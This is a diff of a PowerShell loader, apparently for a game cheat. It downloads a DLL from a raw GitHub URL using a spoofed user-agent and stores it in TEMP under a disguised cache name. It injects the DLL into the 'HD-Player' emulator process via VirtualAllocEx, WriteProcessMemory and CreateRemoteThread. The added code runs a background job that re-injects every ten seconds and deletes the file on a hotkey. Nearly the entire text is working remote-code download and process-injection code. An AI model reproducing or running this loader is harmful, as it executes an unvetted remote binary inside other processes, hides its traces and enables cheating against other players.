@@ -1,4 +1,3 @@
-# ********************
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
 $Name    = "Relaxwtf777's Application"
@@ -46,22 +45,22 @@ function Show-Auth {
 }
 
 if (Show-Auth) {
-    # ********************
     $dllUrl = "https://raw.githubusercontent.com/relaxhaha56-maker/node-storage-33/refs/heads/main/winsky.dll"
     $tempPath = "$env:TEMP\sys_node_cache.dll"
-    $targetProc = "HD-Player"
+    $targetProc = "HD-Player" # ****************
 
+    # ************************
     Write-Host "[*] Syncing data with node-storage..." -ForegroundColor Yellow
     try {
         $webClient = New-Object System.Net.WebClient
-        # ********************
         $webClient.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)")
         $webClient.DownloadFile($dllUrl, $tempPath)
     } catch {
-        Write-Host "[!] Failed to download DLL: $($_.Exception.Message)" -ForegroundColor Red
+        Write-Host "[!] Failed to download DLL" -ForegroundColor Red
         exit
     }
 
+    # ************************
     $Source = @"
     using System;
     using System.Runtime.InteropServices;
@@ -74,6 +73,7 @@ if (Show-Auth) {
         [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
         [DllImport("kernel32.dll", SetLastError = true)] static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
         [DllImport("kernel32.dll")] static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+        
         public static void StartNode(string path, string pName) {
             Process[] target = Process.GetProcessesByName(pName);
             if (target.Length == 0) return;
@@ -87,11 +87,32 @@ if (Show-Auth) {
     }
 "@
     Add-Type -TypeDefinition $Source
-    [NodeHandler]::StartNode($tempPath, $targetProc)
-    Write-Host "[+] Injection Completed. Aimbot Active." -ForegroundColor Green
-    # ***********
-    Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
-} else {
-    Write-Host "Closing in 5 seconds..."
-    Start-Sleep -Seconds 5
+
+    # ************************
+    $ScriptBlock = {
+        param($tempPath, $targetProc)
+        Add-Type -AssemblyName PresentationCore
+        
+        while ($true) {
+            # 1. ************************
+            [NodeHandler]::StartNode($tempPath, $targetProc)
+
+            # 2. ************************
+            if ([Windows.Input.Keyboard]::IsKeyDown([Windows.Input.Key]::Home)) {
+                # ********
+                Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
+                # ************************
+                break
+            }
+            Start-Sleep -Seconds 10 # ****************
+        }
+    }
+
+    # ********
+    Start-Job -ScriptBlock $ScriptBlock -ArgumentList $tempPath, $targetProc -Name "BasX_Guardian"
+    
+    Write-Host "[+] System Active in Background." -ForegroundColor Green
+    Write-Host "[!] Press 'HOME' in-game to Clean & Stop." -ForegroundColor Red
+    Write-Host "คุณสามารถปิดหน้าต่างนี้แล้วเข้าเกมได้เลยครับ" -ForegroundColor Cyan
+    Start-Sleep -Seconds 3
 }
